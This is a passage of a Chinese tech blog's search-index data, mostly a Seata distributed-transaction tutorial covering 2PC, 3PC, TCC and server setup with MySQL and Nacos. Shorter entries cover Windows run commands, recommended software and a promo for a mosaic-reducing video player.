compmgmt.msc：计算机管理90. packager：对象包装程序91. perfmon.msc：计算机性能监测程序92. charmap：启动字符映射表93. cliconfg：SQL SERVER 客户端网络实用程序94. Clipbrd：剪贴板查看器95. conf：启动netmeeting96. certmgr.msc：证书管理实用程序97. regsvr32 /u *.dll：停止dll文件运行98. regsvr32 /u zipfldr.dll：取消ZIP支持99. cmd.exe：CMD命令提示符100. chkdsk.exe：磁盘检查 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"windows系统"},{title:"Seata 入门教程 - 基础篇",url:"/posts/e8b71fbe.html",text:'前言术语 TX 协议：应用或者应用服务器与事务管理器的接口 XA 协议：全局事务管理器与资源管理器的接口。XA 是由 X/Open 组织提出的分布式事务规范，该规范主要定义了全局事务管理器和局部资源管理器之间的接口，主流的数据库产品都实现了 XA 接口。XA 接口是一个双向的系统接口，在事务管理器以及多个资源管理器之间作为通信桥梁。之所以需要 XA 是因为在分布式系统中从理论上讲两台机器是无法达到一致性状态的，因此引入一个单点进行协调。由全局事务管理器管理和协调的事务可以跨越多个资源和进程。全局事务管理器一般使用 XA 二阶段协议与数据库进行交互。 分布式理论CAP 理论： CAP 定理是由加州大学伯克利分校 Eric Brewer 教授提出来的，他指出 WEB 服务无法同时满足一下三个属性： 一致性 (Consistency)：客户端知道一系列的操作都会同时发生 (生效) 可用性 (Availability)：每个操作都必须以可预期的响应结束 分区容错性 (Partition tolerance)：即使出现单个组件无法可用，操作依然可以完成 具体地讲在分布式系统中，任何数据库设计或者 Web 应用至多只能同时支持上面的两个属性。显然，任何横向扩展策略都要依赖于数据分区。因此，设计人员必须在一致性与可用性之间做出选择。 BASE 理论： 在分布式系统中，往往追求的是可用性，它的重要程序比一致性要高，那么如何实现高可用性呢？前人已经给我们提出来了另外一个理论，就是 BASE 理论，它是用来对 CAP 定理进行进一步扩充的。BASE 理论指的是： Basically Available（基本可用） Soft state（软状态） Eventually consistent（最终一致性） BASE 理论是对 CAP 中的一致性和可用性进行一个权衡的结果，理论的核心思想就是：无法做到强一致，但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性（Eventual consistency）。 酸碱平衡： ACID 能够保证事务的强一致性，即数据是实时一致的，这在本地事务中是没有问题的。在分布式事务中，强一致性会极大影响分布式系统的性能，因此分布式系统中遵循 BASE 理论即可。但分布式系统的不同业务场景对一致性的要求也不同。如交易场景下，就要求强一致性，此时就需要遵循 ACID 理论，而在注册成功后发送短信验证码等场景下，并不需要实时一致，因此遵循 BASE 理论即可。因此要根据具体业务场景，在 ACID 和 BASE 之间寻求平衡。 分布式事务基础事务事务指的就是一个操作单元，在这个操作单元中的所有操作最终要保持一致的行为，要么所有操都成功，要么所有的操作都被撤销。简单地说，事务提供一种” 要么什么都不做，要么做全套 “机制。 本地事务本地事务其实可以认为是数据库提供的事务机制。说到数据库事务就不得不说，数据库事务中的四大特性（ACID）： A：原子性（Atomicity），一个事务中的所有操作，要么全部完成，要么全部不完成 C：一致性（Consistency），在一个事务执行之前和执行之后数据库都必须处于一致性状态 I：隔离性（Isolation），在并发环境中，当不同的事务同时操作相同的数据时，事务之间互不影响 D：持久性（Durability），指的是只要事务成功结束，它对数据库所做的更新就必须永久的保存下来 数据库事务在实现时会将一次事务涉及的所有操作全部纳入到一个不可分割的执行单元，该执行单元中的所有操作要么都成功，要么都失败，只要其中任一操作执行失败，都将导致整个事务的回滚。 分布式事务分布式事务指事务的参与者、支持事务的服务器、资源服务器以及事务管理器分别位于不同的分布式系统的不同节点之上。简单的说，就是一次大的操作由不同的小操作组成，这些小的操作分布在不同的服务器上，且属于不同的应用，分布式事务需要保证这些小操作要么全部成功，要么全部失败。本质上来说，分布式事务就是为了保证不同数据库的数据一致性。一句话概括就是，一次业务操作需要跨多个数据源或者需要跨多个系统进行远程调用，就会产生分布式事务问题。 分布式事务的场景 单体系统访问多个数据库：一个服务需要调用多个数据库实例完成数据的增删改操作 多个微服务访问同一个数据库：多个服务需要调用一个数据库实例完成数据的增删改操作 多个微服务访问多个数据库：多个服务需要调用一个数据库实例完成数据的增删改操作 分布式事务协议两阶段提交协议（2PC）分布式系统的一个难点是如何保证架构下多个节点在进行事务性操作的时候保持一致性。为实现这个目的，二阶段提交算法的成立基于以下假设： 该分布式系统中，存在一个节点作为协调者（Coordinator），其他节点作为参与者（Cohorts），且节点之间可以进行网络通信 所有节点都采用预写式日志，且日志被写入后即被保持在可靠的存储设备上，即使节点损坏不会导致日志数据的消失 所有节点不会永久性损坏，即使损坏后仍然可以恢复 第一阶段（投票阶段）: 协调者节点向所有参与者节点询问是否可以执行提交操作（vote），并开始等待各参与者节点的响应 参与者节点执行询问发起为止的所有事务操作，并将 Undo 信息和 Redo 信息写入日志（注意：若成功这里其实每个参与者已经执行了事务操作） 各参与者节点响应协调者节点发起的询问，如果参与者节点的事务操作实际执行成功，则它返回一个” 同意” 消息；如果参与者节点的事务操作实际执行失败，则它返回一个” 中止” 消息 第二阶段（提交执行阶段）： 当协调者节点从所有参与者节点获得的相应消息都为” 同意” 时： 协调者节点向所有参与者节点发出” 正式提交（Commit）” 的请求 参与者节点正式完成操作，并释放在整个事务期间内占用的资源 参与者节点向协调者节点发送” 完成” 消息 协调者节点受到所有参与者节点反馈的” 完成” 消息后，完成事务 中断事务： 如果任一参与者节点在第一阶段返回的响应消息为” 中止”，或者协调者节点在第一阶段的询问超时之前无法获取所有参与者节点的响应消息时： 协调者节点向所有参与者节点发出” 回滚操作（Rollback）” 的请求 参与者节点利用之前写入的 Undo 信息执行回滚，并释放在整个事务期间内占用的资源 参与者节点向协调者节点发送” 回滚完成” 消息 协调者节点受到所有参与者节点反馈的” 回滚完成” 消息后，取消事务 特别注意：不管最后结果如何，第二阶段都会结束当前事务 二阶段提交的缺点： 资源阻塞：执行过程中，所有参与节点都是事务阻塞型的。当参与者占有公共资源时，其他第三方节点访问公共资源不得不处于阻塞状态 参与者发生故障：协调者需要给每个参与者额外指定超时机制，超时后整个事务失败（没有多少容错机制） 协调者发生故障：参与者会一直阻塞下去。需要额外的备机进行容错（这个可以依赖 Paxos 协议实现 HA） 二阶段无法解决的问题：协调者再发出 Commit 消息之后宕机，而唯一接收到这条消息的参与者同时也宕机了。那么即使协调者通过选举协议产生了新的协调者，这条事务的状态也是不确定的，没人知道事务是否已经被提交成功，这有可能导致数据不一致 三阶段提交协议（3PC）与两阶段提交不同的是，三阶段提交有两个改动点： 引入超时机制。同时在协调者和参与者中都引入超时机制 在第一阶段和第二阶段中插入一个准备阶段，保证了在最后提交阶段之前各参与节点的状态是一致的 也就是说，除了引入超时机制之外，3PC 把 2PC 的准备阶段再次一分为二，这样三阶段提交就有 CanCommit、PreCommit、DoCommit 三个阶段. CanCommit 阶段： 3PC 的 CanCommit 阶段其实和 2PC 的准备阶段很像。协调者向参与者发送 Commit 请求，参与者如果可以提交就返回 Yes 响应，否则返回 No 响应： 事务询问：协调者向参与者发送 CanCommit 请求。询问是否可以执行事务提交操作。然后开始等待参与者的响应 响应反馈：参与者接到 CanCommit 请求之后，正常情况下，如果其自身认为可以顺利执行事务，则返回 Yes 响应，并进入预备状态，否则反馈 No PreCommit 阶段： 协调者根据参与者的反应情况来决定是否可以执行事务的 PreCommit 操作。根据响应情况，有以下两种可能： 假如协调者从所有的参与者获得的反馈都是 Yes 响应，那么就会执行事务的预执行 发送预提交请求：协调者向参与者发送 PreCommit 请求后，并进入 Prepared 阶段 事务预提交：参与者接收到 PreCommit 请求后，会执行事务操作，并将 Undo 和 Redo 信息记录到事务日志中 响应反馈：如果参与者成功的执行了事务操作，则返回 ACK 响应，同时开始等待最终指令 假如有任何一个参与者向协调者发送了 No 响应，或者等待超时之后，协调者都没有接到参与者的响应，那么就执行事务的中断 发送中断请求：协调者向所有参与者发送 Abort 请求 中断事务：参与者收到来自协调者的 Abort 请求之后（或超时之后，仍未收到协调者的请求），执行事务的中断 DoCommit 阶段 该阶段进行真正的事务提交，也可以分为以下两种情况： 执行提交： 发送提交请求：协调接收到参与者发送的 ACK 响应，那么它将从预提交状态进入到提交状态，并向所有参与者发送 DoCommit 请求 事务提交：参与者接收到 DoCommit 请求之后，执行正式的事务提交，并在完成事务提交之后释放所有事务资源 响应反馈：事务提交完之后，向协调者发送 ACK 响应 完成事务：协调者接收到所有参与者的 ACK 响应之后，完成事务 中断事务 发送中断请求：协调者向所有参与者发送 Abort 请求 事务回滚：参与者接收到 Abort 请求之后，利用其在阶段二记录的 Undo 信息来执行事务的回滚操作，并在完成回滚之后释放所有的事务资源 反馈结果：参与者完成事务回滚之后，向协调者发送 ACK 消息 中断事务：协调者接收到参与者反馈的 ACK 消息之后，执行事务的中断 这里协调者如果没有接收到参与者发送的 ACK 响应（可能是接受者发送的不是 ACK 响应，也可能响应超时），那么就会执行中断事务。 分布式事务解决方案全局事务（DTP 模型）全局事务是基于 DTP 模型实现的，DTP 是由 X/Open 组织提出的一种分布式事务模型 ——X/Open Distributed Transaction Processing Reference Model。它规定了要实现分布式事务，需要三种角色： AP: Application 应用系统 (微服务) TM: Transaction Manager 事务管理器 (全局事务管理) RM: Resource Manager 资源管理器 (数据库) 整个事务分成两个阶段： 阶段一：表决阶段，所有参与者都将本事务执行预提交，并将能否成功的信息反馈发给协调者 阶段二：执行阶段，协调者根据所有参与者的反馈，通知所有参与者，步调一致地执行提交或者回滚 优点： 提高了数据一致性的概率，实现成本较低 缺点： 单点问题：事务协调者宕机 同步阻塞：延迟了提交时间，加长了资源阻塞时间 数据不一致：在提交的第二阶段，依然存在 Commit 结果未知的情况，有可能导致数据不一致 TCC（两阶段型、补偿型）TCC 即为 Try Confirm Cancel，它属于补偿型分布式事务。TCC 实现分布式事务一共有三个步骤： Try（尝试待执行的业务）：这个过程并未执行业务，只是完成所有业务的一致性检查，并预留好执行所需的全部资源 Confirm（确认执行业务）：确认执行业务操作，不做任何业务检查，只使用 Try 阶段预留的业务资源。通常情况下，采用 TCC 则认为 Confirm 阶段是不会出错的。即只要 Try 成功，Confirm 就一定成功。若 Confirm 阶段真的出错了，需引入重试机制或人工处理 Cancel（取消待执行的业务）：取消 Try 阶段预留的业务资源。通常情况下，采用 TCC 则认为 Cancel 阶段也是一定成功的。若 Cancel 阶段真的出错了，需引入重试机制或人工处理 TCC 两阶段提交与 XA 两阶段提交的区别： XA 是资源层面的分布式事务，强一致性，在两阶段提交的整个过程中，一直会持有资源的锁 TCC 是业务层面的分布式事务，最终一致性，不会一直持有资源的锁 TCC 事务的优缺点： 优点：把数据库层的二阶段提交上提到了应用层来实现，规避了数据库层的 2PC 性能低下的问题 缺点：TCC 的 Try、Confirm 和 Cancel 操作功能需业务提供，开发成本高 最大努力通知（定期校对）最大努力通知也被称为定期校对，其实是对第二种解决方案的进一步优化。它引入了本地消息表来记录错误消息，然后加入失败消息的定期校对功能，来进一步保证消息会被下游系统消费。 第一步：消息由系统 A 投递到消息中间件 1）处理业务的同一事务中，向本地消息表中写入一条记录 2）准备专门的消息发送者不断地发送本地消息表中的消息到消息中间件，如果发送失败则重试 第二步：消息由中间件投递到系统 B 1）消息中间件收到消息后负责将该消息同步投递给相应的下游系统，并触发下游系统的任务执行 2）当下游系统处理成功后，向消息中间件反馈确认应答，消息中间件便可以将该条消息删除，从而该事务完成 3）对于投递失败的消息，利用重试机制进行重试，对于重试失败的，写入错误消息表 4）消息中间件需要提供失败消息的查询接口，下游系统会定期查询失败消息，并将其消费 优缺点： 优点： 一种非常经典的实现，实现了最终一致性 缺点： 消息表会耦合到业务系统中，如果没有封装好的解决方案，会有很多杂活需要处理，在业界并没有成熟的方案来解决 基于可靠消息服务的分布式事务基于可靠消息服务的方案是通过消息中间件保证上、下游应用数据操作的一致性。假设有 A 和 B 两个系统，分别可以处理任务 A 和任务 B。此时存在一个业务流程，需要将任务 A 和任务 B 在同一个事务中处理，此时就可以使用消息中间件来实现这种分布式事务。 第一步：消息由系统 A 投递到消息中间件 1）在系统 A 处理任务 A 前，首先向消息中间件发送一条消息 2）消息中间件收到后将该条消息持久化，但并不投递。持久化成功后，向 A 回复一个确认应答 3）系统 A 收到确认应答后，则可以开始处理任务 A 4）任务 A 处理完成后，向消息中间件发送 Commit 或者 Rollback 请求。该请求发送完成后，对系统 A 而言，该事务的处理过程就结束了 5）如果消息中间件收到 Commit，则向 B 系统投递消息；如果收到 Rollback，则直接丢弃消息。但是如果消息中间件收不到 Commit 和 Rollback 指令，那么就要依靠” 超时询问机制” 超时询问机制 系统 A 除了实现正常的业务流程外，还需提供一个事务询问的接口，供消息中间件调用。当消息中间件收到发布消息便开始计时，如果到了超时没收到确认指令，就会主动调用系统 A 提供的事务询问接口询问该系统目前的状态。该接口会返回三种结果，中间件根据三种结果做出不同反应： 提交：将该消息投递给系统 B 回滚：直接将消息丢弃 处理中：继续等待 第二步：消息由中间件投递到系统 B 消息中间件向下游系统投递完消息后便进入阻塞等待状态，下游系统便立即进行任务的处理，任务处理完成后便向消息中间件返回应答。 如果消息中间件收到确认应答后便认为该事务处理完毕 如果消息中间件在等待确认应答超时之后就会重新投递，直到下游消费者返回消费成功响应为止。一般消息中间件可以设置消息重试的次数和时间间隔，如果最终还是不能成功投递，则需要手工干预。这里之所以使用人工干预，而不是使用让 Ａ 系统回滚，主要是考虑到整个系统设计的复杂度问题 基于可靠消息服务的分布式事务，前半部分使用异步，注重性能；后半部分使用同步，注重开发成本。 Seata 介绍Seata 简介2019 年 1 月，阿里巴巴中间件团队发起了开源项目 Fescar（Fast &amp; Easy Commit And Rollback），其愿景是让分布式事务的使用像本地事务的使用一样，简单和高效，并逐步解决开发者们遇到的分布式事务方面的所有难题。Fescar 开源后，蚂蚁金服加入 Fescar 社区参与共建，并在 Fescar 0.4.0 版本中贡献了 TCC 模式。为了打造更中立、更开放、生态更加丰富的分布式事务开源社区，经过社区核心成员的投票，决定对 Fescar 进行品牌升级，于 2019 年 5 月 开始更名为 Seata，意为：Simple Extensible Autonomous Transaction Architecture，是一套一站式分布式事务解决方案，为用户提供了 AT、TCC、SAGA 和 XA 事务模式。Seata 融合了阿里巴巴和蚂蚁金服在分布式事务技术上的积累，并沉淀了新零售、云计算和新金融等场景下丰富的实践经验，但要实现适用于所有的分布式事务场景的愿景，仍有很长的路要走。更多介绍可参考：Seata 项目、Seata 官方示例代码、Seata 官网、Seata 官方中文文档 Seata 演进历史 TXC：Taobao Transaction Constructor，阿里巴巴中间件团队自 2014 年起启动该项目，以满足应用程序架构从单一服务变为微服务所导致的分布式事务问题 GTS：Global Transaction Service，2016 年 TXC 作为阿里中间件的产品，更名为 GTS 发布 FESCAR：2019 年开始基于 TXC/GTS 开源 FESCAR SEATA：2019 年 5 月 FESCAR 更名为 SEATA Seata 设计理念Seata 的设计目标是对业务无侵入，因此从业务无侵入的 2PC 方案着手，在传统 2PC 的基础上演进。它把一个分布式事务理解成一个包含了若干分支事务的全局事务。全局事务的职责是协调其下管辖的分支事务达成一致，要么一起成功提交，要么一起失败回滚。此外，通常分支事务本身就是一个关系型数据库的本地事务。 Seata 的三大组件 TC：Transaction Coordinator 事务协调器，维护全局和分支事务的状态，负责协调并驱动全局事务的提交或回滚 TM：Transaction Manager 事务管理器，控制全局事务的边界，负责开启一个全局事务，并最终发起全局提交或全局回滚的决议 RM：Resource Manager 资源管理器，管理分支事务处理的资源，向 TC 注册分支事务，上报分支事务的状态，接受 TC 的命令来提交或者回滚分支事务 Seata 的执行流程 1）A 服务的 TM 向 TC 申请开启一个全局事务，TC 就会创建一个全局事务并返回一个唯一的 XID 2）A 服务的 RM 向 TC 注册分支事务，并将其纳入 XID 对应全局事务的管辖 3）A 服务执行分支事务，向数据库执行操作 4）A 服务开始远程调用 B 服务，此时 XID 会在微服务的调用链上传播 5）B 服务的 RM 向 TC 注册分支事务，并将其纳入 XID 对应的全局事务的管辖 6）B 服务执行分支事务，向数据库执行操作 7）全局事务调用链处理完毕，TM 根据有无异常向 TC 发起全局事务的提交或者回滚 8）TC 协调其管辖之下的所有分支事务，决定是否回滚 Seata 实现的 2PC 与传统 2PC 的区别 1）架构层次方面：传统 2PC 方案的 RM 实际上是在数据库层，RM 本质上就是数据库自身，通过 XA 协议实现，而 Seata 的 RM 是以 Jar 包的形式作为中间件层部署在应用程序这一侧的 2）两阶段提交方面：传统 2PC 无论第二阶段的决议是 Commit 还是 Rollback，事务性资源的锁都要保持到 Phase2 完成才释放。而 Seata 的做法是在 Phase1 就将本地事务提交，这样就可以省去 Phase2 持锁的时间，整体提高了效率 Seata Server 安装Seata 分 TC、TM 和 RM 三个角色，TC（Server 端）需要单独作为服务端部署，TM 和 RM（Client 端）由业务系统集成（如 Maven、Gradle）。 Seata Server 下载1）Seata Server 的官方下载地址在这里，直接下载已编译好的二进制包（seata-server-1.4.0.tar.gz ），然后解压即可使用 12345# 下载$ wget https://github.com/seata/seata/releases/download/v1.4.0/seata-server-1.4.0.tar.gz# 解压$ tar -xvf seata-server-1.4.0.tar.gz 2）Seata 的初始化资源的官方下载地址在这里，需要下载 Seata 的源代码包（Source code），后面初始化数据库或者配置中心时会用到资源目录里的文件 1234567891011# 下载$ wget https://github.com/seata/seata/archive/v1.4.0.tar.gz# 解压# tar -xvf v1.4.0.tar.gz# 资源目录的结构seata-1.4.0/script├── client├── config-center└── server 资源目录说明如下： server：Server 端数据库脚本及各个容器配置 client：存放 Client 端的 SQL 脚本、参数配置 config-center：各个配置中心参数导入脚本，其中的 config.txt(包含 Server 和 Client，原名为 nacos-config.txt) 为通用参数文件 Seata Server 配置1）将 Seata Server（TC）的存储模式更改为 DB，即使用数据库来存储全局事务会话信息，同时自定义事务组的名称。这里演示使用的数据库为 MySQL，默认支持的数据库类型包括：MySQL、Oracle、PostgreSQL、H2、Oceanbase，其中 service.vgroupMapping 的详细介绍可以看自定义事务组的名称 12345678910111213141516171819202122232425262728# 备份配置文件$ cp seata/conf/file.conf seata/conf/file.conf.bak# 编辑配置文件，更改或者新增以下内容$ vim seata/conf/file.confservice { vgroupMapping.tx_group_test = "default" #自定义事务组的名称，若不存在service配置项，直接新增对应的配置内容即可 default.grouplist = "127.0.0.1:8091" enableDegrade = false disable = false max.commit.retry.timeout = "-1" max.rollback.retry.timeout = "-1" disableGlobalTransaction = false}store { mode = "db" # 存储模式 db { dbType = "mysql" # 数据库类型 datasource = "druid" # 数据库连接池 driverClassName = "com.mysql.cj.jdbc.Driver" # 数据库驱动 url = "jdbc:mysql://127.0.0.1:3306/seata?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false" # 数据库连接地址 user = "mysql" # 数据库用户名 password = "mysql" # 数据库密码 }} 2）初始化 Seata Server（TC）依赖的 MySQL 数据库，用于存储全局事务会话信息，SQL 初始化脚本的位置是 Seata 源码目录下的 script/server/db/mysql.sql。全局事务会话信息由三块内容构成，全局事务 –&gt; 分支事务 –&gt; 全局锁，对应的表分别是 global_table、branch_table、lock_table 12345678910111213141516171819# 创建Seata数据库mysql&gt; create database seata default character set utf8;# 切换数据库mysql&gt; use seata;# 执行SQL初始化脚本mysql&gt; source seata-1.4.0/script/server/db/mysql.sql# 查看数据库表mysql&gt; show tables;+-----------------+| Tables_in_seata |+-----------------+| branch_table || global_table || lock_table |+-----------------+3 rows in set (0.00 sec) 3）指定 Seata Server（TC）依赖的注册中心，这里使用的注册中心是 Nacos。为了演示方便，这里不再使用配置中心来存储 TC 的相关配置，即直接使用本地的 file.conf 配置文件。默认支持的注册中心与配置中心列表如下： 配置中心支持类型：File、Nacos 、Apollo、Zookeeper、Consul、Etcd3 注册中心支持类型：File 、Nacos 、Eureka、Zookeeper、Consul、Etcd3、Sofa、Redis 123456789101112131415161718192021222324252627# 备份配置文件$ cp seata/conf/registry.conf seata/conf/registry.conf.bak# 编辑配置文件，更改或者新增以下内容$ vim seata/conf/registry.confregistry { type = "nacos" nacos { application = "seata-server" serverAddr = "127.0.0.1:8848" group = "SEATA_GROUP" namespace = "" cluster = "default" username = "" password = "" }}config { type = "file" file { name = "file.conf" }} Seata Server 启动先将 Seata Server 依赖的数据库、注册中心服务启动了，最后才启动 Seata Server。 1234567891011121314# 创建GC的日志目录$ mkdir seata/logs# 进入bin目录$ cd seata/bin# 执行启动脚本$ sh seata-server.sh# 或者后台启动$ nohup sh seata-server.sh &amp;# 或者指定启动参数$ sh seata-server.sh -h 127.0.0.1 -p 8091 -n 1 启动参数说明如下： -h: 注册到注册中心的 IP -p: Seata Server 的本地监听端口，默认端口是 8091 -m: 全局事务会话信息存储模式，file、db、redis，优先读取启动参数 (Seata-Server 1.3 及以上版本支持 Redis) -n: Server Node，多个 Server 时，需区分各自节点，用于生成不同区间的 transactionId，以免冲突 -e: 多环境配置可以参考这里 特别注意：堆内存建议分配 2G，堆外内存 1G，JVM 的内存参数可以直接在 seata/bin/-server.sh 脚本里调整 Seata Server 成功启动后，在注册中心的服务列表里，可以看到 Seata Server 的服务已经成功注册： Seata Server 配置介绍配置文件说明 conf/file.conf： TC 的配置文件，用于指定 TC 的相关配置。如果使用了配置中心，也可以将 file.conf 里的配置信息写入到配置中心。 conf/registry.conf：用于指定 TC 的注册中心和 TC 的配置文件，默认类型都是 file。如果使用其他注册中心，要求 Seata Server 自身也注册到注册中心。 配置中心使用若在 registry.conf 中指定使用配置中心来存储 TC 的相关配置（如下），即利用配置中心来替代 file.conf 配置文件，那么此时需要手动将 file.conf 里的配置信息添加到配置中心 12345678910111213config { type = "nacos" nacos { serverAddr = "127.0.0.1:8848" namespace = "" group = "SEATA_GROUP" username = "" password = "" } ...} Seata 官方提供了将配置信息批量写入到各种主流配置中心的 Shell 脚本，存放路径是在 Seata 源码目录下的 script/config-center 目录（如下） 1234567891011121314script/config-center├── apollo│&nbsp;&nbsp; └── apollo-config.sh├── config.txt├── consul│&nbsp;&nbsp; └── consul-config.sh├── etcd3│&nbsp;&nbsp; └── etcd3-config.sh├── nacos│&nbsp;&nbsp; ├── nacos-config.py│&nbsp;&nbsp; └── nacos-config.sh├── README.md└── zk └── zk-config.sh 其中 config.txt 为通用参数文件，包含了 Seata Server 需要的所有配置信息，只需执行对应的 Shell 脚本将配置信息写入到配置中心即可。值得一提的是，config.txt 文件必须在 xxxx.sh 的上级目录里；若使用 Nacos 作为配置中心，执行脚本时可以指定一些启动参数，如 Nacos 的 IP、端口号、命名空间、配置组等，Shell 脚本的具体使用方法可以查看 script/config-center/README.md 说明文档。 1$ nacos-config.sh -h 127.0.0.1 -p 8848 -t namespace -g group -u username -w password 成功批量导入配置信息到配置中心后，控制台会输出如下提示： 1234========================================================================= Complete initialization parameters, total-count:79 , failure-count:0========================================================================= Init nacos config finished, please start seata-server. 访问 Nacos 的控制台，可以看到已经有对应的配置信息 配置 TC 的存储模式Seata Server（TC）的存储模式现有 File、DB、Redis 三种（后续将引入 Raft、Mongodb），需要在 file.conf 配置文件中指定（如下） 123456789101112131415161718192021store { mode = "file" ## file store property file { ## store location dir dir = "sessionStore" # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions maxBranchSessionSize = 16384 # globe session size , if exceeded throws exceptions maxGlobalSessionSize = 512 # file buffer size , if exceeded allocate new buffer fileWriteBufferCacheSize = 16384 # when recover batch read size sessionReloadReadSize = 100 # async, sync flushDiskMode = async } ...} 默认存储模式为 File，若使用 File 模式则无需改动任何配置，直接启动即可，每种模式的说明如下： File 模式为单机模式，全局事务会话信息在内存中读写，并持久化为本地文件 root.data，性能较高 DB 模式为高可用模式，全局事务会话信息通过 DB 共享，性能会差一点 Redis 模式在 Seata-Server 1.3 及以上版本开始支持，性能较高，存在事务信息丢失风险，需要配置合适当前场景的 Redis 持久化配置 自定义事务组的名称特别注意，file.conf 中的 service.vgroupMapping 这个配置，在 Spring Cloud 中的值默认是 ${spring.application.name}-fescar-service-group，可以通过指定 application.yml 中的 spring.cloud.alibaba.seata.tx-service-group 这个属性来覆盖；但是必须要和 file.conf 中的 service.vgroupMapping 一致，否则会出现 no available service \'null\' found, please make sure registry config correct 的错误，举例说明如下： 123service { vgroupMapping.tx_group_test = "default"} 12345spring: cloud: alibaba: seata: tx-service-group: tx_group_test 在上述的配置中，Spring Cloud 中 tx-service-group 的值也必须为 tx_group_test；如果将 vgroupMapping.xxxx 中的 xxxx（Key 值）改为 abcdefg，则 Spring Cloud 中 tx-service-group 的值也必须为 abcdefg，即这两个值必须保持一致 Seata Server 的坑default.grouplist 属性在 Seata Server 的 file.conf 配置文件中，有个 default.grouplist 配置，该配置的使用说明如下： 1）只有在 registry.conf 中配置了 registry.type=file，即注册中心是 File 模式时，该配置才会起作用 2）对应的值可以配置多个，配置多个就需要搭建 Seata Server 集群。由于默认并未提供本地文件的同步功能，所以在 store.mode=file 模式下，这种集群方式的配置会报错；如果 Seata Server 搭建为集群，且 store.mode=db，这样就可以通过 DB 来共享 TC（Seata Server） 集群间的数据 3）当 registry.type=file 时，这个 default.grouplist 才会起作用，但是 File 方式并不能提供一个注册中心的完整功能，比如健康检查机制，实例列表的更新剔出等，建议选择 Nacos 、Eureka、Redis、Zookeeper、Consul、Etcd3、Sofa 作为注册中心 4）registry.type=file 或 config.type=file 的设计初衷，是让开发者在不依赖第三方注册中心或配置中心的前提下，可以通过 File 这种简单的直连快速验证 Seata 服务，达到快速上手的目的 service.vgroup_mapping 属性Seata Server &lt;=1.0 的版本用的是 service.vgroup_mapping，但在新版本里改成了 service.vgroupMapping。若应用启动后无法连接 Seata Server，且抛出了以下异常信息，此时应该注意使用的是不是旧的 service.vgroup_mapping 1no available service \'null\' found, please make sure registry config correct 在 file.conf 配置文件中，service.vgroupMapping 支持配置多个： 1234service.vgroupMapping.user-service-group=defaultservice.vgroupMapping.order-service-group=defaultservice.vgroupMapping.account-service-group=defaultservice.vgroupMapping.storage-service-group=default 参考文献 分布式事务解决方案 微服务分布式事务 4 种解决方案实战 大规模 SOA 系统中的分布事务处事（程立） 下篇 - Seata 入门教程（电商实战篇） Seata 入门教程 - 实战篇（电商） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务 分布式"},{title:"Windows 装机软件推荐",url:"/posts/697a4777.html",text:'磁盘磁盘分区 迷你兔（MiniTool）分区向导 系统备份 迷你兔（MiniTool）数据备份大师 数据恢复 迷你兔（MiniTool）数据恢复软件 FTPFTP 服务器 FileZilla Server FTP 客户端 FileZilla Client var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"windows系统"},{title:"一款去马赛克的视频播放器 JavPlayer",url:"/posts/1f1f7d32.html",text:'相关站点 JavPlayer 官网 限时免费试用完整版下载 产品概述 JavPlayer 是一款视频播放器（收费），可以减少马赛克而不会丢失细节，让沉睡在硬盘里的视频变成宝藏。JavPlayer 使用了 TecoGAN，TecoGAN 是一种使用深度学习的视频超分辨率算法，接管部分处理的记录模式正在测试中。特别说明，请尊重原视频创作者的版权，请勿滥用并非法传播经处理后的视频，由此产生的后果及一切法律责任自负，相关责任一概与本站无关。 操作简便 可以通过拖放视频文件来播放它 如果是在 2012~2016 年发布高质量视频，则会感受到默认设置的马赛克缩小效果 如果在设置面板中进行了轻微调整，则会扩展可支持的视频宽度 可以通过一个按钮捕获需要专用播放器的视频 先进的技术 分析图像并自动确定马赛克的面积和粗糙度 根据马赛克的粗糙度（单元尺寸）进行适当的处​​理 即使不是高性能 PC，也可以在播放全高清视频时实时处理 不仅使用简单的模糊，而且使用了诸如超分辨率滤波器的方法 各种功能 每部电影的设置将自动保存并在下次播放时加载 具有一般功能，例如逐帧，跳过，范围选择循环，固定宽高比和颜色校正 如果为每个场景设置马赛克缩小处理，则可以在整个长片中获得足够的效果，仅限产品版本 如果录制已处理的视频，则可在移动设备上使用 推荐的运行环境 安装 DirectX11 CPU：i3 或更高 GPU：GeForceGT710 或更高版本（或等效的内置 GPU），推荐用于 VR MainXemory 的 GTX750 或更高版本：4G 或更高 操作系统：Windows8、Windows10（32 位，64 位），Windows7 上无法使用捕获和录制 TecoGAN 需要兼容 AVX 的 CPU（SandyBridge 或更高版本，i3 或更高版本）和 64 位 Windows TrialVersion 的限制 录制创建的视频宽度固定为 640 像素，可在产品版本中指定 即使指定了范围，录制也将在 1 分钟后结束，产品版本无限制 处理设置适用于整个视频，可以为每个部分单独设置产品版本 VR 模式下的马赛克减少最多 